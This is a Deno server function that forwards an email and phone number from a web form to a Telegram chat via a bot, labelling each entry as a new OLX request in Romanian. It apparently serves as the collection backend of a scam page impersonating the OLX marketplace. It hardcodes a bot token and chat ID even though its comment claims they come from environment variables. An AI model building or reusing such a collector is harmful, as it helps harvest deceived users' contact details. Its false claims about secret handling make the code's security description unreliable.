/*
  # Send form data to Telegram Bot
  
  1. Function Purpose
    - Receives form data (email and phone) from the frontend
    - Sends formatted message to specified Telegram chat via bot
    
  2. Security
    - CORS headers for frontend access
    - Environment variables for bot token and chat ID
    
  3. Error Handling
    - Comprehensive error handling for API calls
    - Proper HTTP status codes
*/

interface FormData {
  email: string;
  phone: string;
}

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
};

Deno.serve(async (req: Request) => {
  try {
    if (req.method === "OPTIONS") {
      return new Response(null, {
        status: 200,
        headers: corsHeaders,
      });
    }

    if (req.method !== "POST") {
      return new Response(
        JSON.stringify({ error: "Method not allowed" }),
        {
          status: 405,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    const { email, phone }: FormData = await req.json();

    // Validate input
    if (!email || !phone) {
      return new Response(
        JSON.stringify({ error: "Email and phone are required" }),
        {
          status: 400,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    // Get environment variables
    const botToken = "8275821657:AAEBFQ3jJaCERjkYVVRJpnqZwuWGLvb71ks";
    const chatId = "-1002904177569";

    if (!botToken || !chatId) {
      console.error("Missing Telegram configuration");
      return new Response(
        JSON.stringify({ error: "Server configuration error" }),
        {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        }
      );
    }

    // Format message for Telegram
    const message = `🆕 Cerere nouă OLX\n\n📧 Email: ${email}\n📱 Telefon: ${phone}\n\n⏰ Data: ${new Date().toLocaleString('ro-RO')}`;

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error("Telegram API error:", errorText);
      throw new Error("Failed to send message to Telegram");
    }

    return new Response(
      JSON.stringify({ 
        success: true, 
        message: "Data sent successfully" 
      }),
      {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );

  } catch (error) {
    console.error("Error in send-to-telegram function:", error);
    
    return new Response(
      JSON.stringify({ 
        error: "Internal server error",
        details: error.message 
      }),
      {
        status: 500,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      }
    );
  }
});